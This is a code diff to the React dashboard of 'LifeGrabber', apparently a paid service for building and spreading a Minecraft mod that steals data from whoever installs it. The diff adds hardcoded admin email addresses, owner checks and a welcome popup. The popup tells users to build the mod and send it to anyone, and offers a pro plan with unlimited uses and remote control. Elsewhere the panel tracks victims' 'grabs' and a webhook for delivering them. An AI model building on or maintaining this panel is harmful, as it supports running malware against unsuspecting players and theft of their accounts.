@@ -16,6 +16,8 @@ const colors = {
 };
 
 
+const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];
+
 function Dashboard({ userEmail, freeUses, isPro, trialExhausted }) {
   const [grabCount, setGrabCount] = useState(0);
   const [mcUsername, setMcUsername] = useState('');
@@ -23,28 +25,50 @@ function Dashboard({ userEmail, freeUses, isPro, trialExhausted }) {
   const [mcLoading, setMcLoading] = useState(true);
   const [webhookUrl, setWebhookUrl] = useState('');
   const [showPopup, setShowPopup] = useState(false);
+  const [showWelcomePopup, setShowWelcomePopup] = useState(false);
+  const [needsSetupAfterWelcome, setNeedsSetupAfterWelcome] = useState(false);
   const [saving, setSaving] = useState(false);
 
   useEffect(() => {
     if (!userEmail) return;
-    const isAdmin = userEmail === 'lifegrading@gmail.com';
+    const isAdmin = ADMIN_EMAILS.includes(userEmail.toLowerCase());
     const url = isAdmin ? '/api/grabs' : `/api/grabs?owner_email=${encodeURIComponent(userEmail)}`;
     fetch(url)
       .then(r => r.json())
       .then(d => setGrabCount(d.grabs?.length || 0))
       .catch(() => {});
+
     fetch(`/api/user/minecraft?email=${encodeURIComponent(userEmail)}`)
       .then(r => r.json())
       .then(d => {
+        const isNewUser = !d.username;
         if (d.username) {
           setMcUsername(d.username);
           setMcSaved(true);
-        } else {
+        }
+
+        const seenWelcome = typeof window !== 'undefined' && sessionStorage.getItem('lg_welcome_shown_' + userEmail);
+        if (!seenWelcome) {
+          setShowWelcomePopup(true);
+          if (isNewUser) {
+            setNeedsSetupAfterWelcome(true);
+          }
+        } else if (isNewUser) {
           setShowPopup(true);
         }
         setMcLoading(false);
       })
-      .catch(() => { setMcLoading(false); setShowPopup(true); });
+      .catch(() => {
+        setMcLoading(false);
+        const seenWelcome = typeof window !== 'undefined' && sessionStorage.getItem('lg_welcome_shown_' + userEmail);
+        if (!seenWelcome) {
+          setShowWelcomePopup(true);
+          setNeedsSetupAfterWelcome(true);
+        } else {
+          setShowPopup(true);
+        }
+      });
+
     fetch(`/api/user/settings?email=${encodeURIComponent(userEmail)}`)
       .then(r => r.json())
       .then(d => { if (d?.webhook_url) setWebhookUrl(d.webhook_url); })
@@ -83,7 +107,18 @@ function Dashboard({ userEmail, freeUses, isPro, trialExhausted }) {
     setSaving(false);
   };
 
-  const isOwner = userEmail === 'lifegrading@gmail.com';
+  const handleCloseWelcome = () => {
+    if (typeof window !== 'undefined') {
+      sessionStorage.setItem('lg_welcome_shown_' + userEmail, 'true');
+    }
+    setShowWelcomePopup(false);
+    if (needsSetupAfterWelcome) {
+      setShowPopup(true);
+      setNeedsSetupAfterWelcome(false);
+    }
+  };
+
+  const isOwner = ADMIN_EMAILS.includes(userEmail?.toLowerCase());
   const showTrialBadge = !isPro && !isOwner && freeUses !== null && freeUses !== undefined;
 
   return (
@@ -155,6 +190,45 @@ function Dashboard({ userEmail, freeUses, isPro, trialExhausted }) {
         </div>
       </div>
     </div>
+      {showWelcomePopup && (
+        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, backdropFilter: 'blur(8px)' }}>
+          <div style={{ background: '#111218', border: '1px solid #2a2d38', borderRadius: 16, padding: 36, width: 480, maxWidth: '90vw', position: 'relative', boxShadow: '0 20px 40px rgba(0,0,0,0.6)' }}>
+            <button onClick={handleCloseWelcome} style={{ position: 'absolute', top: 16, right: 16, background: 'none', border: 'none', color: '#6b6e7b', fontSize: 20, cursor: 'pointer' }}>✕</button>
+            
+            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16 }}>
+              <div style={{ width: 32, height: 32, borderRadius: 8, background: 'rgba(34, 197, 94, 0.15)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 18 }}>🎮</div>
+              <h2 style={{ fontSize: 20, fontWeight: 700, color: colors.text, margin: 0 }}>Welcome to LifeGrabber!</h2>
+            </div>
+
+            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 10, padding: '16px 18px', marginBottom: 20 }}>
+              <p style={{ fontSize: 13.5, color: '#d1d5db', lineHeight: 1.6, margin: '0 0 12px 0' }}>
+                To build the mod you need to go to build section and click Consent mod and send that mod to anyone u want! Free trial has 3 usages, if you want ultimated usages or remote control u need to buy pro at the plans section!
+              </p>
+              <p style={{ fontSize: 13.5, color: '#9ca3af', lineHeight: 1.6, margin: 0 }}>
+                If you want or need support join the discord. We will reply asap.
+              </p>
+            </div>
+
+            <div style={{ display: 'flex', gap: 12 }}>
+              <a
+                href="https://discord.gg/FV2668v4Zp"
+                target="_blank"
+                rel="noreferrer"
+                style={{ flex: 1, padding: '10px 0', textAlign: 'center', background: '#5865F2', color: '#fff', borderRadius: 8, fontSize: 13.5, fontWeight: 600, textDecoration: 'none', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}
+              >
+                <span>💬</span> Join Discord
+              </a>
+              <button
+                onClick={handleCloseWelcome}
+                className="btn-smooth"
+                style={{ flex: 1, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13.5, fontWeight: 700, cursor: 'pointer' }}
+              >
+                Close
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
       {showPopup && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, backdropFilter: 'blur(8px)' }}>
           <div style={{ background: '#111218', border: '1px solid #2a2d38', borderRadius: 16, padding: 40, width: 420, position: 'relative' }}>
@@ -584,7 +658,7 @@ function DashboardContent({ userEmail, freeUses, isPro, trialExhausted }) {
     setPage(tab);
   }, [tab]);
 
-  const isOwner = userEmail === 'lifegrading@gmail.com';
+  const isOwner = ADMIN_EMAILS.includes(userEmail?.toLowerCase());
   const canAccess = isPro || isOwner || freeUses > 0;
 
   return (
@@ -610,7 +684,7 @@ export default function DashboardPage() {
       .then(d => {
         if (d.user?.email) {
           setUserEmail(d.user.email);
-          if (d.user.email.toLowerCase() === 'lifegrading@gmail.com') {
+          if (ADMIN_EMAILS.includes(d.user.email.toLowerCase())) {
             setIsPro(true);
             setAuthChecked(true);
           } else {
